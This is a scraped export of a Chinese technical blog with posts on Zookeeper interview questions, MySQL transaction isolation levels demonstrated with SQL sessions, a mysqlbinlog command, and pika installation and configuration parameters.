负载均衡和 nginx 负载均衡区别zk 的负载均衡是可以调控，nginx 只是能调权重，其他需要可控的都需要自己写插件；但是 nginx 的吞吐量比 zk 大很多，应该说按业务选择用哪种方式。 20. Zookeeper 有哪几种几种部署模式？部署模式：单机模式、伪集群模式、集群模式。 21. 集群最少要几台机器，集群规则是怎样的?集群规则为 2N+1 台，N&gt;0，即 3 台。 22. 集群支持动态添加机器吗？其实就是水平扩容了，Zookeeper 在这方面不太好。两种方式：全部重启：关闭所有 Zookeeper 服务，修改配置之后启动。不影响之前客户端的会话。逐个重启：在过半存活即可用的原则下，一台机器重启不影响整个集群对外提供服务。这是比较常用的方式。3.5 版本开始支持动态扩容。 23. Zookeeper 对节点的 watch 监听通知是永久的吗？为什么不是永久的?不是。官方声明：一个 Watch 事件是一个一次性的触发器，当被设置了 Watch的数据发生了改变的时候，则服务器将这个改变发送给设置了Watch 的客户端，以便通知它们。为什么不是永久的，举个例子，如果服务端变动频繁，而监听的客户端很多情况下，每次变动都要通知到所有的客户端，给网络和服务器造成很大压力。一般是客户端执行 getData(“/节点 A”,true)，如果节点 A 发生了变更或删除，客户端会得到它的 watch 事件，但是在之后节点 A又发生了变更，而客户端又没有设置 watch 事件，就不再给客户端发送。在实际应用中，很多情况下，我们的客户端不需要知道服务端的每一次变动，我只要最新的数据即可。 24. Zookeeper 的 java 客户端都有哪些？java 客户端：zk 自带的 zkclient 及 Apache 开源的 Curator。 25. chubby 是什么，和 zookeeper 比你怎么看？chubby 是 google 的，完全实现 paxos 算法，不开源。zookeeper 是 chubby的开源实现，使用 zab 协议，paxos 算法的变种。 26. 说几个 zookeeper 常用的命令。常用命令：ls get set create delete 等。 27. ZAB 和 Paxos 算法的联系与区别？相同点：（1）两者都存在一个类似于 Leader 进程的角色，由其负责协调多个 Follower 进程的运行（2）Leader 进程都会等待超过半数的 Follower 做出正确的反馈后，才会将一个提案进行提交（3）ZAB 协议中，每个 Proposal 中都包含一个 epoch 值来代表当前的 Leader周期，Paxos 中名字为 Ballot不同点：ZAB 用来构建高可用的分布式数据主备系统（Zookeeper），Paxos 是用来构建分布式一致性状态机系统。 28. Zookeeper 的典型应用场景Zookeeper 是一个典型的发布/订阅模式的分布式数据管理与协调框架，开发人员可以使用它来进行分布式数据的发布和订阅。通过对 Zookeeper 中丰富的数据节点进行交叉使用，配合 Watcher 事件通知机制，可以非常方便的构建一系列分布式应用中年都会涉及的核心功能，如：（1）数据发布/订阅（2）负载均衡（3）命名服务（4）分布式协调/通知（5）集群管理（6）Master 选举（7）分布式锁（8）分布式队列 数据发布/订阅 介绍数据发布/订阅系统，即所谓的配置中心，顾名思义就是发布者发布数据供订阅者进行数据订阅。目的动态获取数据（配置信息）实现数据（配置信息）的集中式管理和数据的动态更新设计模式Push 模式Pull 模式数据（配置信息）特性（1）数据量通常比较小（2）数据内容在运行时会发生动态更新（3）集群中各机器共享，配置一致如：机器列表信息、运行时开关配置、数据库配置信息等基于 Zookeeper 的实现方式· 数据存储：将数据（配置信息）存储到 Zookeeper 上的一个数据节点· 数据获取：应用在启动初始化节点从 Zookeeper 数据节点读取数据，并在该节点上注册一个数据变更 Watcher· 数据变更：当变更数据时，更新 Zookeeper 对应节点数据，Zookeeper会将数据变更通知发到各客户端，客户端接到通知后重新读取变更后的数据即可。 负载均衡 zk 的命名服务命名服务是指通过指定的名字来获取资源或者服务的地址，利用 zk 创建一个全局的路径，这个路径就可以作为一个名字，指向集群中的集群，提供的服务的地址，或者一个远程的对象等等。 分布式通知和协调 对于系统调度来说：操作人员发送通知实际是通过控制台改变某个节点的状态，然后 zk 将这些变化发送给注册了这个节点的 watcher的所有客户端。对于执行情况汇报：每个工作进程都在某个目录下创建一个临时节点。并携带工作的进度数据，这样汇总的进程可以监控目录子节点的变化获得工作进度的实时的全局情况。 zk 的命名服务（文件系统） 命名服务是指通过指定的名字来获取资源或者服务的地址，利用 zk创建一个全局的路径，即是唯一的路径，这个路径就可以作为一个名字，指向集群中的集群，提供的服务的地址，或者一个远程的对象等等。 zk 的配置管理（文件系统、通知机制） 程序分布式的部署在不同的机器上，将程序的配置信息放在 zk 的 znode 下，当有配置发生改变时，也就是 znode 发生变化时，可以通过改变zk 中某个目录节点的内容，利用 watcher 通知给各个客户端，从而更改配置。 Zookeeper 集群管理（文件系统、通知机制） 所谓集群管理无在乎两点：是否有机器退出和加入、选举 master。对于第一点，所有机器约定在父目录下创建临时目录节点，然后监听父目录节点的子节点变化消息。一旦有机器挂掉，该机器与 zookeeper 的连接断开，其所创建的临时目录节点被删除，所有其他机器都收到通知：某个兄弟目录被删除，于是，所有人都知道：它上船了。新机器加入也是类似，所有机器收到通知：新兄弟目录加入，highcount 又有了，对于第二点，我们稍微改变一下，所有机器创建临时顺序编号目录节点，每次选取编号最小的机器作为master 就好。 Zookeeper 分布式锁（文件系统、通知机制） 有了 zookeeper 的一致性文件系统，锁的问题变得容易。锁服务可以分为两类，一个是保持独占，另一个是控制时序。对于第一类，我们将 zookeeper 上的一个 znode 看作是一把锁，通过 createznode的方式来实现。所有客户端都去创建 /distribute_lock节点，最终成功创建的那个客户端也即拥有了这把锁。用完删除掉自己创建的 distribute_lock 节点就释放出锁。对于第二类， /distribute_lock 已经预先存在，所有客户端在它下面创建临时顺序编号目录节点，和选 master 一样，编号最小的获得锁，用完删除，依次方便。Zookeeper 队列管理（文件系统、通知机制）两种类型的队列：（1）同步队列，当一个队列的成员都聚齐时，这个队列才可用，否则一直等待所有成员到达。（2）队列按照 FIFO 方式进行入队和出队操作。第一类，在约定目录下创建临时目录节点，监听节点数目是否是我们要求的数目。第二类，和分布式锁服务中的控制时序场景基本原理一致，入列有编号，出列按编号。在特定的目录下创建 PERSISTENT_SEQUENTIAL节点，创建成功时Watcher 通知等待的队列，队列删除序列号最小的节点用以消费。此场景下Zookeeper 的 znode 用于消息存储，znode存储的数据就是消息队列中的消息内容，SEQUENTIAL 序列号就是消息的编号，按序取出即可。由于创建的节点是持久化的，所以不必担心队列消息的丢失问题。","categories":[{"name":"zookeeper","slug":"zookeeper","permalink":"https://wuhaocn.github.io/categories/zookeeper/"}],"tags":[{"name":"zookeeper","slug":"zookeeper","permalink":"https://wuhaocn.github.io/tags/zookeeper/"}]},{"title":"MySQL事务详解","slug":"data/mysql/MySQL事务详解","date":"2023-11-15T03:40:25.006Z","updated":"2023-11-15T03:40:25.006Z","comments":true,"path":"2023/11/15/data/mysql/MySQL事务详解/","link":"","permalink":"https://wuhaocn.github.io/2023/11/15/data/mysql/MySQL%E4%BA%8B%E5%8A%A1%E8%AF%A6%E8%A7%A3/","excerpt":"","text":"1.MySQL事务特性数据库的事务（Transaction）是一种机制、一个操作序列，包含了一组数据库操作命令。事务把所有的命令作为一个整体一起向系统提交或撤销操作请求，即这一组数据库命令要么都执行，要么都不执行，因此事务是一个不可分割的工作逻辑单元。在数据库系统上执行并发操作时，事务是作为最小的控制单元来使用的，特别适用于多用户同时操作的数据库系统。例如，航空公司的订票系统、银行、保险公司以及证券交易系统等。事务具有 4 个特性，即原子性（Atomicity）、一致性（Consistency）、隔离性（Isolation）和持久性（Durability），这 4 个特性通常简称为 ACID。 1.1. 原子性事务是一个完整的操作。事务的各元素是不可分的（原子的）。事务中的所有元素必须作为一个整体提交或回滚。如果事务中的任何元素失败，则整个事务将失败。以银行转账事务为例，如果该事务提交了，则这两个账户的数据将会更新。如果由于某种原因，事务在成功更新这两个账户之前终止了，则不会更新这两个账户的余额，并且会撤销对任何账户余额的修改，事务不能部分提交。 1.2. 一致性当事务完成时，数据必须处于一致状态。也就是说，在事务开始之前，数据库中存储的数据处于一致状态。在正在进行的事务中. 数据可能处于不一致的状态，如数据可能有部分被修改。然而，当事务成功完成时，数据必须再次回到已知的一致状态。通过事务对数据所做的修改不能损坏数据，或者说事务不能使数据存储处于不稳定的状态。以银行转账事务事务为例。在事务开始之前，所有账户余额的总额处于一致状态。在事务进行的过程中，一个账户余额减少了，而另一个账户余额尚未修改。因此，所有账户余额的总额处于不一致状态。事务完成以后，账户余额的总额再次恢复到一致状态。 1.3. 隔离性对数据进行修改的所有并发事务是彼此隔离的，这表明事务必须是独立的，它不应以任何方式依赖于或影响其他事务。修改数据的事务可以在另一个使用相同数据的事务开始之前访问这些数据，或者在另一个使用相同数据的事务结束之后访问这些数据。另外，当事务修改数据时，如果任何其他进程正在同时使用相同的数据，则直到该事务成功提交之后，对数据的修改才能生效。张三和李四之间的转账与王五和赵二之间的转账，永远是相互独立的。 1.4. 持久性事务的持久性指不管系统是否发生了故障，事务处理的结果都是永久的。一个事务成功完成之后，它对数据库所作的改变是永久性的，即使系统出现故障也是如此。也就是说，一旦事务被提交，事务对数据所做的任何变动都会被永久地保留在数据库中。事务的 ACID 原则保证了一个事务或者成功提交，或者失败回滚，二者必居其一。因此，它对事务的修改具有可恢复性。即当事务失败时，它对数据的修改都会恢复到该事务执行前的状态。 2.重要介绍2.1 事务隔离级别3.事物隔离级别上文介绍了 MySQL 事务的四大特性，其中事务的隔离性就是指当多个事务同时运行时，各事务之间相互隔离，不可互相干扰。如果事务没有隔离性，就容易出现脏读、不可重复读和幻读等情况。为了保证并发时操作数据的正确性，数据库都会有事务隔离级别的概念。 脏读 脏读是指一个事务正在访问数据，并且对数据进行了修改，但是这种修改还没有提交到数据库中，这时，另外一个事务也访问这个数据，然后使用了这个数据。 不可重复读 不可重复读是指在一个事务内，多次读取同一个数据。在这个事务还没有结束时，另外一个事务也访问了该同一数据。那么，在第一个事务中的两次读数据之间，由于第二个事务的修改，那么第一个事务两次读到的的数据可能是不一样的。这样在一个事务内两次读到的数据是不一样的，因此称为是不可重复读。 幻读 幻读是指当事务不是独立执行时发生的一种现象，例如第一个事务对一个表中的数据进行了修改，这种修改涉及到表中的全部数据行。同时，第二个事务也修改这个表中的数据，这种修改是向表中插入一行新数据。那么，以后就会发生操作第一个事务的用户发现表中还有没有修改的数据行，就好象发生了幻觉一样。为了解决以上这些问题，标准 SQL 定义了 4 类事务隔离级别，用来指定事务中的哪些数据改变是可见的，哪些数据改变是不可见的。MySQL 包括的事务隔离级别如下： 读未提交（READ UNCOMITTED） 读提交（READ COMMITTED） 可重复读（REPEATABLE READ） 串行化（SERIALIZABLE） MySQL 事务隔离级别可能产生的问题如下表所示： 隔离级别 脏读 不可重复读 幻读 READ UNCOMITTED √ √ √ READ COMMITTED × √ √ REPEATABLE READ × × √ SERIALIZABLE × × × MySQL 的事务的隔离级别由低到高分别为 READ UNCOMITTED、READ COMMITTED、REPEATABLE READ、SERIALIZABLE。低级别的隔离级别可以支持更高的并发处理，同时占用的系统资源更少。 下面根据实例来一一阐述它们的概念和联系。 3.1. 读未提交（READ UNCOMITTED，RU）顾名思义，读未提交就是可以读到未提交的内容。如果一个事务读取到了另一个未提交事务修改过的数据，那么这种隔离级别就称之为读未提交。在该隔离级别下，所有事务都可以看到其它未提交事务的执行结果。因为它的性能与其他隔离级别相比没有高多少，所以一般情况下，该隔离级别在实际应用中很少使用。 例 1 主要演示了在读未提交隔离级别中产生的脏读现象。 示例 1 先在 test 数据库中创建 testnum 数据表，并插入数据。SQL 语句和执行结果如下：1234mysql&gt; CREATE TABLE testnum( num INT(4)); Query OK, 0 rows affected (0.57 sec) mysql&gt; INSERT INTO test.testnum (num) VALUES(1),(2),(3),(4),(5); Query OK, 5 rows affected (0.09 sec) 下面的语句需要在两个命令行窗口中执行。为了方便理解，我们分别称之为 A 窗口和 B 窗口。在 A 窗口中修改事务隔离级别，因为 A 窗口和 B 窗口的事务隔离级别需要保持一致， 所以我们使用 SET GLOBAL TRANSACTION 修改全局变量。SQL 语句如下： 123mysql&gt; SET GLOBAL TRANSACTION ISOLATION LEVEL READ UNCOMMITTED; Query OK, 0 rows affected (0.04 sec) flush privileges; Query OK, 0 rows affected (0.04 sec) 查询事务隔离级别，SQL 语句和运行结果如下： 1mysql&gt; show variables like &#x27;%tx_isolation%&#x27;\\G *************************** 1. row *************************** Variable_name: tx_isolation Value: READ-UNCOMMITTED 1 row in set, 1 warning (0.00 sec) 结果显示，现在 MySQL 的事务隔离级别为 READ-UNCOMMITTED。 在 A 窗口中开启一个事务，并查询 testnum 数据表，SQL 语句和运行结果如下： 12mysql&gt; BEGIN; Query OK, 0 rows affected (0.00 sec) mysql&gt; SELECT * FROM testnum; +------+ | num | +------+ | 1 | | 2 | | 3 | | 4 | | 5 | +------+ 5 rows in set (0.00 sec) 打开 B 窗口，查看当前 MySQL 的事务隔离级别，SQL 语句如下： 1mysql&gt; show variables like &#x27;%tx_isolation%&#x27;\\G *************************** 1. row *************************** Variable_name: tx_isolation Value: READ-UNCOMMITTED 1 row in set, 1 warning (0.00 sec) 确定事务隔离级别是 READ-UNCOMMITTED 后，开启一个事务，并使用 UPDATE 语句更新 testnum 数据表，SQL 语句和运行结果如下： 1mysql&gt; BEGIN; Query OK, 0 rows affected (0.00 sec) mysql&gt; UPDATE test.testnum SET num=num*2 WHERE num=2; Query OK, 1 row affected (0.02 sec) Rows matched: 1 Changed: 1 Warnings: 0 现在返回 A 窗口，再次查询 testnum 数据表，SQL 语句和运行结果如下：1mysql&gt; SELECT * FROM testnum; +------+ | num | +------+ | 1 | | 4 | | 3 | | 4 | | 5 | +------+ 5 rows in set (0.02 sec) 由结果可以看出，A 窗口中的事务读取到了更新后的数据。 下面在 B 窗口中回滚事务，SQL 语句和运行结果如下：1mysql&gt; ROLLBACK; Query OK, 0 rows affected (0.09 sec) 在 A 窗口中查询 testnum 数据表，SQL 语句和运行结果如下：1mysql&gt; SELECT * FROM testnum; +------+ | num | +------+ | 1 | | 2 | | 3 | | 4 | | 5 | +------+ 5 rows in set (0.00 sec) 当 MySQL 的事务隔离级别为 READ UNCOMITTED 时，首先分别在 A 窗口和 B 窗口中开启事务，在 B 窗口中的事务更新但未提交之前， A 窗口中的事务就已经读取到了更新后的数据。但由于 B 窗口中的事务回滚了，所以 A 事务出现了脏读现象。 使用读提交隔离级别可以解决实例中产生的脏读问题。 3.2. 读提交（READ COMMITTED，RC）顾名思义，读提交就是只能读到已经提交了的内容。 如果一个事务只能读取到另一个已提交事务修改过的数据，并且其它事务每对该数据进行一次修改并提交后，该事务都能查询得到最新值，那么这种隔离级别就称之为读提交。 该隔离级别满足了隔离的简单定义：一个事务从开始到提交前所做的任何改变都是不可见的，事务只能读取到已经提交的事务所做的改变。 这是大多数数据库系统的默认事务隔离级别（例如 Oracle、SQL Server），但不是 MySQL 默认的。 例 2 演示了在读提交隔离级别中产生的不可重复读问题。 示例 2 使用 SET 语句将 MySQL 事务隔离级别修改为 READ COMMITTED，并查看。SQL 语句和运行结果如下：1mysql&gt; SET GLOBAL TRANSACTION ISOLATION LEVEL READ COMMITTED; Query OK, 0 rows affected (0.00 sec) mysql&gt; show variables like &#x27;%tx_isolation%&#x27;\\G *************************** 1. row *************************** Variable_name: tx_isolation Value: READ-COMMITTED 1 row in set, 1 warning (0.00 sec) 确定当前事务隔离级别为 READ COMMITTED 后，开启一个事务，SQL 语句和运行结果如下： 1mysql&gt; BEGIN; Query OK, 0 rows affected (0.00 sec) 在 B 窗口中开启事务，并使用 UPDATE 语句更新 testnum 数据表，SQL 语句和运行结果如下： 1mysql&gt; BEGIN; Query OK, 0 rows affected (0.00 sec) mysql&gt; UPDATE test.testnum SET num=num*2 WHERE num=2; Query OK, 1 row affected (0.07 sec) Rows matched: 1 Changed: 1 Warnings: 0 在 A 窗口中查询 testnum 数据表，SQL 语句和运行结果如下： 1mysql&gt; SELECT * from test.testnum; +------+ | num | +------+ | 1 | | 2 | | 3 | | 4 | | 5 | +------+ 5 rows in set (0.00 sec) 提交 B 窗口中的事务，SQL 语句和运行结果如下： 1mysql&gt; COMMIT; Query OK, 0 rows affected (0.07 sec) 在 A 窗口中查询 testnum 数据表，SQL 语句和运行结果如下：1mysql&gt; SELECT * from test.testnum; +------+ | num | +------+ | 1 | | 4 | | 3 | | 4 | | 5 | +------+ 5 rows in set (0.00 sec) 当 MySQL 的事务隔离级别为 READ COMMITTED 时，首先分别在 A 窗口和 B 窗口中开启事务，在 B 窗口中的事务更新并提交后，A 窗口中的事务读取到了更新后的数据。在该过程中，A 窗口中的事务必须要等待 B 窗口中的事务提交后才能读取到更新后的数据，这样就解决了脏读问题。而处于 A 窗口中的事务出现了不同的查询结果，即不可重复读现象。 使用可重复读隔离级别可以解决实例中产生的不可重复读问题。 3.3. 可重复读（REPEATABLE READ，RR）顾名思义，可重复读是专门针对不可重复读这种情况而制定的隔离级别，可以有效的避免不可重复读。 在一些场景中，一个事务只能读取到另一个已提交事务修改过的数据，但是第一次读过某条记录后，即使其它事务修改了该记录的值并且提交，之后该事务再读该条记录时，读到的仍是第一次读到的值，而不是每次都读到不同的数据。那么这种隔离级别就称之为可重复读。 可重复读是 MySQL 的默认事务隔离级别，它能确保同一事务的多个实例在并发读取数据时，会看到同样的数据行。在该隔离级别下，如果有事务正在读取数据，就不允许有其它事务进行修改操作，这样就解决了可重复读问题。 例 3 演示了在可重复读隔离级别中产生的幻读问题。 示例 3 在 test 数据库中创建 testuser 数据表，SQL 语句和执行结果如下：1mysql&gt; CREATE TABLE testuser( -&gt; id INT (4) PRIMARY KEY, -&gt; name VARCHAR(20)); Query OK, 0 rows affected (0.29 sec) 使用 SET 语句修改事务隔离级别，SQL 语句如下：1mysql&gt; SET GLOBAL TRANSACTION ISOLATION LEVEL REPEATABLE READ; Query OK, 0 rows affected (0.00 sec) 在 A 窗口中开启事务，并查询 testuser 数据表，SQL 语句和运行结果如下：1mysql&gt; BEGIN; Query OK, 0 rows affected (0.00 sec) mysql&gt; SELECT * FROM test.testuser where id=1; Empty set (0.04 sec) 在 B 窗口中开启一个事务，并向 testuser 表中插入一条数据，SQL 语句和运行结果如下：1mysql&gt; BEGIN; Query OK, 0 rows affected (0.00 sec) mysql&gt; INSERT INTO test.testuser VALUES(1,&#x27;zhangsan&#x27;); Query OK, 1 row affected (0.04 sec) mysql&gt; COMMIT; Query OK, 0 rows affected (0.06 sec) 现在返回 A 窗口，向 testnum 数据表中插入数据，SQL 语句和运行结果如下：1mysql&gt; INSERT INTO test.testuser VALUES(1,&#x27;lisi&#x27;); ERROR 1062 (23000): Duplicate entry &#x27;1&#x27; for key &#x27;PRIMARY&#x27; mysql&gt; SELECT * FROM test.testuser where id=1; Empty set (0.00 sec) 使用串行化隔离级别可以解决实例中产生的幻读问题。 3.4. 串行化（SERIALIZABLE）如果一个事务先根据某些条件查询出一些记录，之后另一个事务又向表中插入了符合这些条件的记录，原先的事务再次按照该条件查询时，能把另一个事务插入的记录也读出来。那么这种隔离级别就称之为串行化。 SERIALIZABLE 是最高的事务隔离级别，主要通过强制事务排序来解决幻读问题。简单来说，就是在每个读取的数据行上加上共享锁实现，这样就避免了脏读、不可重复读和幻读等问题。但是该事务隔离级别执行效率低下，且性能开销也最大，所以一般情况下不推荐使用。 https://zhuanlan.zhihu.com/p/506585990 https://blog.51cto.com/u_15714244/5461724","categories":[{"name":"MySQL","slug":"MySQL","permalink":"https://wuhaocn.github.io/categories/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://wuhaocn.github.io/tags/MySQL/"}]},{"title":"MySQL日志分析","slug":"data/mysql/MySQL日志","date":"2023-11-15T03:40:25.006Z","updated":"2023-11-15T03:40:25.006Z","comments":true,"path":"2023/11/15/data/mysql/MySQL日志/","link":"","permalink":"https://wuhaocn.github.io/2023/11/15/data/mysql/MySQL%E6%97%A5%E5%BF%97/","excerpt":"","text":"慢日志binlog/usr/local/mysql/bin/mysqlbinlog –no-defaults –base64-output=decode-rows –database=testdb -v mysql-bin.007849 | grep -10 DELETE | grep -3 12345678","categories":[{"name":"MySQL","slug":"MySQL","permalink":"https://wuhaocn.github.io/categories/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://wuhaocn.github.io/tags/MySQL/"}]},{"title":"pika安装","slug":"data/pika/pika安装","date":"2023-11-15T03:40:25.006Z","updated":"2023-11-15T03:40:25.006Z","comments":true,"path":"2023/11/15/data/pika/pika安装/","link":"","permalink":"https://wuhaocn.github.io/2023/11/15/data/pika/pika%E5%AE%89%E8%A3%85/","excerpt":"","text":"快速试用如果想快速试用pika，目前提供了Centos5，Centos6和Debian(Ubuntu16) binary版本，可以在release页面看到，具体文件是pikaX.Y.Z_xxx_bin.tar.gz。 12345671. unzip file$ tar zxf pikaX.Y.Z_xxx_bin.tar.gz2. change working directory to outputnote: we should in this directory, caz the RPATH is ./lib;$ cd output3. run pika:$ ./bin/pika -c conf/pika.conf 编译安装CentOS (Fedora, Redhat) 安装必要的lib 1$ sudo yum install gflags-devel snappy-devel glog-devel protobuf-devel 可选择的lib 1$ sudo yum install zlib-devel lz4-devel libzstd-devel 安装gcc 1$ sudo yum install gcc-c++ 如果机器gcc版本低于4.8，需要切换到gcc4.8或者以上，下面指令可临时切换到gcc4.8 123$ sudo wget -O /etc/yum.repos.d/slc6-devtoolset.repo http://linuxsoft.cern.ch/cern/devtoolset/slc6-devtoolset.repo$ sudo yum install --nogpgcheck devtoolset-2$ scl enable devtoolset-2 bash 获取项目源代码 1$ git clone https://github.com/OpenAtomFoundation/pika.git 更新依赖的子项目 12$ cd pika$ git submodule update --init 切换到最新release版本 12a. 执行 git tag 查看最新的release tag，（如 v2.3.1）b. 执行 git checkout TAG切换到最新版本，（如 git checkout v2.3.1） 编译 1$ make note: 若编译过程中，提示有依赖的库没有安装，则有提示安装后再重新编译 Debian (Ubuntu) 安装必要的lib 123$ sudo apt-get install libgflags-dev libsnappy-dev$ sudo apt-get install libprotobuf-dev protobuf-compiler$ sudo apt install libgoogle-glog-dev 获取项目源代码 12$ git clone https://github.com/OpenAtomFoundation/pika.git$ cd pika 切换到最新release版本 12a. 执行 git tag 查看最新的release tag，（如 v2.3.1）b. 执行 git checkout TAG切换到最新版本，（如 git checkout v2.3.1） 编译1$ make note: 若编译过程中，提示有依赖的库没有安装，则有提示安装后再重新编译 静态编译方法使用1$ ./output/bin/pika -c ./conf/pika.conf 注意启动出现 Attempt to free invalid pointer 问题请尝试升级tcmalloc 版本，建议使用gperftools 2.7 版本包含的tcmalloc。","categories":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/categories/redis/"}],"tags":[{"name":"pika","slug":"pika","permalink":"https://wuhaocn.github.io/tags/pika/"}]},{"title":"pika配置","slug":"data/pika/pika配置","date":"2023-11-15T03:40:25.006Z","updated":"2023-11-15T03:40:25.007Z","comments":true,"path":"2023/11/15/data/pika/pika配置/","link":"","permalink":"https://wuhaocn.github.io/2023/11/15/data/pika/pika%E9%85%8D%E7%BD%AE/","excerpt":"","text":"pika 端口port : 9221 pika是多线程的, 该参数能够配置pika的线程数量, 不建议配置值超过部署服务器的CPU核心数量thread-num : 1 处理命令用户请求命令线程池的大小thread-pool-size : 8 sync 主从同步时候从库执行主库传递过来命令的线程数量sync-thread-num : 6 sync 处理线程的任务队列大小, 不建议修改sync-buffer-size : 10 Pika日志目录, 用于存放INFO, WARNING, ERROR日志以及用于同步的binlog(write2fine)文件log-path : ./log/ Pika数据目录db-path : ./db/ Pika 底层单个rocksdb单个memtable的大小, 设置越大写入性能越好但会在buffer刷盘时带来更大的IO负载, 请依据使用场景合理配置RocksDb-Tuning-Guidewrite-buffer-size : 268435456 Pika 的连接超时时间配置, 单位为秒, 当连接无请求时(进入sleep状态)开始从配置时间倒计时, 当倒计时为0时pika将强行断开该连接, 可以通过合理配置该参数避免可能出现的pika连接数用尽问题, 该参数默认值为60timeout : 60 密码管理员密码, 默认为空, 如果该参数与下方的userpass参数相同(包括同时为空), 则userpass参数将自动失效, 所有用户均为管理员身份不受userblacklist参数的限制requirepass : password 同步验证密码, 用于slave(从库)连接master(主库)请求同步时进行验证, 该参数需要与master(主库)的requirepass一致masterauth : 用户密码, 默认为空, 如果该参数与上方的userpass参数相同(包括同时为空), 则本参数将自动失效, 所有用户均为管理员身份不受userblacklist参数的限制userpass : userpass 指令黑名单, 能够限制通过userpass登录的用户, 这些用户将不能使用黑名单中的指令, 指令之间使用”,”隔开, 默认为空建议将高风险命令配置在该参数中userblacklist : FLUSHALL, SHUTDOWN, KEYS, CONFIG 分为经典模式和分片模式，[classic | sharding]，经典模式中支持多db的配置instance-mode : classic 经典模式下下指定db的数量，使用方式和redis一致databases : 1 分片模式下每一个table中默认的slot数量default-slot-num：16 定义一个副本组又多少个从副本，目前支持的配置选项范围[0, 1, 2, 3, 4], 0代表不开启此功能replication-num : 0 定义在返回客户端之前主副本收到多少个从副本的ACK反馈信息。目前可以配置的选项范围[0, …replicaiton-num]，0代表不开启此功能。consensus-level : 0 Pika的dump文件名称前缀, bgsave后生成的文件将以该前缀命名dump-prefix : backup- 守护进程模式 [yes | no]daemonize : yes slotmigrate [yes | no], pika3.0.0暂不支持该参数#slotmigrate : no Pika dump目录设置, bgsave后生成的文件将存放在该目录中dump-path : /data1/pika9001/dump/ dump目录过期时间, 单位为天, 默认为0即永不过期dump-expire: 0 pidfile Path pid文件目录pidfile : /data1/pika9001/pid/9001.pid pika最大连接数配置参数maxclients : 20000 rocks-db的sst文件体积, sst文件是层级的, 文件越小, 速度越快, 合并代价越低, 但文件数量就会超多, 而文件越大, 速度相对变慢, 合并代价大, 但文件数量会很少, 默认是 20Mtarget-file-size-base : 20971520 binlog(write2file)文件保留时间, 7天, 最小为1, 超过7天的文件会被自动清理expire-logs-days : 7 binlog(write2file)文件最大数量, 200个, 最小为10, 超过200个就开始自动清理, 始终保留200个expire-logs-nums : 200 root用户连接保证数量：2个, 即时Max Connection用完, 该参数也能确保本地（127.0.0.1）有2个连接可以同来登陆pikaroot-connection-num : 2 慢日志记录时间, 单位为微秒, pika的慢日志记录在pika-ERROR.log中, pika没有类似redis slow log的慢日志提取apislowlog-log-slower-than : 10000 slave是否是只读状态(yes/no, 1/0)slave-read-only : 0Pika db 同步路径配置参数db-sync-path : ./dbsync/ 该参数能够控制全量同步时的传输速度, 合理配置该参数能够避免网卡被用尽, 该参数范围为11024, 意为:1MB/s1024MB/s，当该参数被配置为小于0或大于1024时, 该参数会被自动配置为1024db-sync-speed : -1 (1024MB/s) 指定网卡network-interface : eth1同步参数配置, 适用于从库节点(slave), 该参数格式为ip:port, 例如192.168.1.2:6666, 启动后该示例会自动向192.168.1.2的6666端口发送同步请求slaveof : master-ip:master-port配置双主或Hub需要的server id, 不使用双主或Hub请忽略该参数server-id : 1 双主配置, 不使用双主请忽略以下配置double-master-ip : 双主对端Ipdouble-master-port : 双主对端Portdouble-master-server-id : 双主对端server id 自动全量compact, 通过配置的参数每天定时触发一次自动全量compact, 特别适合存在多数据结构大量过期、删除、key名称复用的场景参数格式为:”启动时间(小时)-结束时间(小时)/磁盘空余空间百分比”, 例如你需要配置一个每天在凌晨3点~4点之间自动compact的任务同时该任务仅仅在磁盘空余空间不低于30%的时候执行, 那么应配置为:03-04/30, 该参数默认为空compact-cron : 自动全量compact, 该参与与compact-cron的区别为, compact-cron每天仅在指定时间段执行, 而compact-interval则以配置时间为周期循环执行, 例如你需要配置一个每4小时执行一次的自动compact任务, 同时该任务仅仅在磁盘空余空间不低于30%的时候执行, 那么该参数应配置为:4/30, 该参数默认为空compact-interval : 从库实例权重设置, 仅配合哨兵使用,无其它功能, 权重低的slave会优先选举为主库, 该参数默认为0(不参与选举)slave-priority : 该参数仅适用于pika跨版本同步时不同版本的binlog能够兼容并成功解析, 该参数可配置为[new | old]当该参数被配置为new时, 该实例仅能作为3.0.0及以上版本pika的从库, 与pika2.3.3~2.3.5不兼容当该参数被配置为old时, 该时候仅能作为2.3.3~2.3.5版本pika的从库, 与pika3.0.0及以上版本不兼容该参数默认值为new, 该参数可在没有配置同步关系的时候通过config set动态调整, 一旦配置了同步关系则不可动态修改需要先执行slaveof no one关闭同步配置, 之后即可通过config set动态修改identify-binlog-type : new 主从同步流量控制的的窗口，主从高延迟情形下可以通过提高该参数提高同步性能。默认值9000最大值90000。sync-window-size : 9000 处理客户端连接请求的最大缓存大小，可配置的数值为67108864(64MB) 或 268435456(256MB) 或 536870912(512MB)默认是268435456(256MB)，需要注意的是主从的配置需要一致。单条命令超过此buffer大小，服务端会自动关闭与客户端的连接。max-conn-rbuf-size : 268435456 ####################Critical Settings# 危险参数################### write2file文件体积, 默认为100MB, 一旦启动不可修改, limited in [1K, 2G]binlog-file-size : 104857600 压缩方式[snappy, zlib, lz4, zstd]默认为snappy, 一旦启动不可修改官方发布的二进制提供默认的snaapy的静态连接。如果需要其他压缩方式请自行下载相应静态库并进行编译。compression : snappy 指定后台flush线程数量, 默认为1, 范围为[1, 4]max-background-flushes : 1 指定后台压缩线程数量, 默认为1, 范围为[1, 4]max-background-compactions : 1 DB可以使用的打开文件的数量, 默认为5000max-cache-files : 5000 pika实例所拥有的rocksdb实例使用的memtable大小上限，如果rocksdb实际使用超过这个数值，下一次写入会造成刷盘Rocksdb-Basic-Tuningmax-write-buffer-size : 10737418240 限制命令返回数据的大小，应对类似于keys *等命令，返回值过大将内存耗尽。max-client-response-size : 1073741824 pika引擎中层级因子, 用于控制每个层级与上一层级总容量的倍数关系, 默认为10(倍), 允许调整为5(倍)max-bytes-for-level-multiplier : 10 统计对于key的操作次数，对于操作频繁的一部分key做小规模compactionmax-cache-statistic-keys 为受监控key的数量，配置为0代表关闭此功能max-cache-statistic-keys : 0 如果开启小规模compaction，如果对于key操作次数超过small-compaction-threshold上限，那么对该key进行compactionsmall-compaction-threshold : 